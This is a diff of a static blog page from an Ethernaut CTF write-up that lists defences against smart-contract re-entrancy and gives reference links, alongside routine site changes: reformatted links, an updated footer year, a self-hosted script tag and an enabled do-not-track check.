+<p>Both of the major bugs that led to the <a href="https://en.wikipedia.org/wiki/The_DAO_%28organization%29"  class="external-link" target="_blank" rel="noopener">DAO</a> <a href="https://coinmarketcap.com/alexandria/article/a-history-of-the-dao-hack"  class="external-link" target="_blank" rel="noopener">hack</a> were related to <a href="https://consensys.github.io/smart-contract-best-practices/attacks/reentrancy/"  class="external-link" target="_blank" rel="noopener">re-entrancy</a>
+issues. <a href="https://hackingdistributed.com/2016/06/18/analysis-of-the-dao-exploit/"  class="external-link" target="_blank" rel="noopener">Here is the great in-depth explanation of the DAO hack</a>, so be sure to
+give it a read if you&rsquo;re interested to understand it deeper.</p>
 <p>There are several ways to prevent these type of attacks:</p>
 <ul>
 <li>Always be aware that other contracts can interact with your
 contract. Sending ETH is a regular function call, which can
 call (re-enter) your contract.</li>
-<li>Use the
-<a href="https://fravoll.github.io/solidity-patterns/checks_effects_interactions.html"  class="external-link" target="_blank" rel="noopener">Checks
-Effects Interactions</a> pattern.</li>
-<li>Adopt the
-<a href="https://docs.openzeppelin.com/contracts/4.x/api/security#ReentrancyGuard"  class="external-link" target="_blank" rel="noopener">OpenZeppelin&rsquo;s
-ReentrancyGuard</a>. The
-<a href="https://github.com/transmissions11/solmate"  class="external-link" target="_blank" rel="noopener">solmate</a> has
-the
-<a href="https://github.com/transmissions11/solmate/blob/main/src/utils/ReentrancyGuard.sol"  class="external-link" target="_blank" rel="noopener">ReentrancyGuard</a>
+<li>Use the <a href="https://fravoll.github.io/solidity-patterns/checks_effects_interactions.html"  class="external-link" target="_blank" rel="noopener">Checks Effects Interactions</a> pattern.</li>
+<li>Adopt the <a href="https://docs.openzeppelin.com/contracts/4.x/api/security#ReentrancyGuard"  class="external-link" target="_blank" rel="noopener">OpenZeppelin&rsquo;s ReentrancyGuard</a>. The <a href="https://github.com/transmissions11/solmate"  class="external-link" target="_blank" rel="noopener">solmate</a> has the <a href="https://github.com/transmissions11/solmate/blob/main/src/utils/ReentrancyGuard.sol"  class="external-link" target="_blank" rel="noopener">ReentrancyGuard</a>
 too.</li>
 <li>Implement some kind of &ldquo;mutex&rdquo; yourself using the <code>lock</code> state variable.</li>
 </ul>
@@ -570,14 +550,10 @@ too.</li>
   </a>
 </h2>
 <ul>
-<li><a href="https://docs.soliditylang.org/en/latest/security-considerations.html#re-entrancy"  class="external-link" target="_blank" rel="noopener">Re-entrancy</a>
-from Solidity docs (Security Considerations).</li>
-<li><a href="https://dasp.co/#item-1"  class="external-link" target="_blank" rel="noopener">Re-entrancy attack</a> from the
-Decentralized Application Security Project.</li>
-<li><a href="https://fravoll.github.io/solidity-patterns/checks_effects_interactions.html"  class="external-link" target="_blank" rel="noopener">Checks
-Effects Interactions</a> from the Solidity Patterns.</li>
-<li><a href="https://swcregistry.io/docs/SWC-107"  class="external-link" target="_blank" rel="noopener">SWC-107</a> from the
-Smart Contract Weakness Classification and Test Cases.</li>
+<li><a href="https://docs.soliditylang.org/en/latest/security-considerations.html#re-entrancy"  class="external-link" target="_blank" rel="noopener">Re-entrancy</a> from Solidity docs (Security Considerations).</li>
+<li><a href="https://dasp.co/#item-1"  class="external-link" target="_blank" rel="noopener">Re-entrancy attack</a> from the Decentralized Application Security Project.</li>
+<li><a href="https://fravoll.github.io/solidity-patterns/checks_effects_interactions.html"  class="external-link" target="_blank" rel="noopener">Checks Effects Interactions</a> from the Solidity Patterns.</li>
+<li><a href="https://swcregistry.io/docs/SWC-107"  class="external-link" target="_blank" rel="noopener">SWC-107</a> from the Smart Contract Weakness Classification and Test Cases.</li>
 </ul>
 <hr>
 <p>This was another little write-up on the Ethernaut CTF.
@@ -638,7 +614,7 @@ Thank you for reading!</p>
     
       1985 -
     
-    2025
+    2026
      Vasiliy Yorkin 
     
   </section>
@@ -660,6 +636,11 @@ Thank you for reading!</p>
   
 
   
+  
+  
+  <script src="https://vyorkin.org/custom.min.e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855.js" integrity="sha256-47DEQpj8HBSa&#43;/TImW&#43;5JCeuQeRkm5NMpJWZG3hSuFU="></script>
+  
+  
 
   
 
@@ -668,7 +649,7 @@ Thank you for reading!</p>
       <script async src="https://www.googletagmanager.com/gtag/js?id=G-F8R77TYF8B"></script>
       <script>
         var doNotTrack = false;
-        if ( false ) {
+        if ( true ) {
           var dnt = (navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack);
           var doNotTrack = (dnt == "1" || dnt == "yes");
         }
